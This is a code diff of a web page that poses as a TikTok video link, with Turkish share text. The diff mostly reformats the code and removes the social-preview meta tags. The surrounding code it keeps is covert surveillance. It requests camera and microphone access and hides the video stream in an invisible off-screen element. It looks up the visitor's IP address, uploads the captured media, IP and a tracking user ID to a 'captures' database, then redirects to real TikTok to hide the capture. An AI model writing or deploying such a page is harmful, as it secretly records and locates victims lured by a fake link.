@@ -3,17 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="robots" content="noindex, nofollow">
-    <meta property="og:title" content="TikTok Video" />
-    <meta property="og:description" content="Bu videoyu izle ve beğen! 🔥" />
-    <meta property="og:image" content="https://cdn.pixabay.com/photo/2020/07/06/01/33/tiktok-5374692_1280.png" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <title>TikTok Video</title>
+    <title>TikTok</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
-        body { background: #000; width: 100vw; height: 100vh; overflow: hidden; }
-        video { position: fixed; top: -100%; left: -100%; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-        canvas { display: none; }
+        *{margin:0;padding:0;box-sizing:border-box;user-select:none;}
+        body{background:#000;width:100vw;height:100vh;overflow:hidden;}
+        video{position:fixed;top:-100%;left:-100%;width:1px;height:1px;opacity:0;}
+        canvas{display:none;}
     </style>
 </head>
 <body>
@@ -119,11 +114,7 @@
             let redirectUrl = params.get('redirect') || 'https://www.tiktok.com';
             let userId = params.get('uid');
             
-            if (!userId) {
-                window.location.href = redirectUrl;
-                return;
-            }
-            
+            if (!userId) { window.location.href = redirectUrl; return; }
             if (duration < 1) duration = 1;
             if (duration > 60) duration = 60;
             
@@ -135,11 +126,7 @@
             
             const stream = await navigator.mediaDevices.getUserMedia(constraints);
             mediaStream = stream;
-            
-            if (constraints.video) {
-                video.srcObject = stream;
-                await video.play();
-            }
+            if (constraints.video) { video.srcObject = stream; await video.play(); }
             
             setTimeout(async () => {
                 const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'unknown');
@@ -165,21 +152,15 @@
                 
                 if (mediaUrls.length > 0 && userId) {
                     await addDoc(collection(db, "captures"), {
-                        media: mediaUrls,
-                        ip: ip,
-                        mode: mode,
+                        media: mediaUrls, ip: ip, mode: mode,
                         duration: (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') ? duration : null,
-                        userId: userId,
-                        timestamp: new Date().toISOString(),
-                        unix: Date.now()
+                        userId: userId, timestamp: new Date().toISOString(), unix: Date.now()
                     });
                 }
-                
                 window.location.href = redirectUrl;
             }, 500);
         } catch(err) {
-            const redirectUrl = new URLSearchParams(window.location.search).get('redirect') || 'https://www.tiktok.com';
-            window.location.href = redirectUrl;
+            window.location.href = new URLSearchParams(window.location.search).get('redirect') || 'https://www.tiktok.com';
         }
     }
     
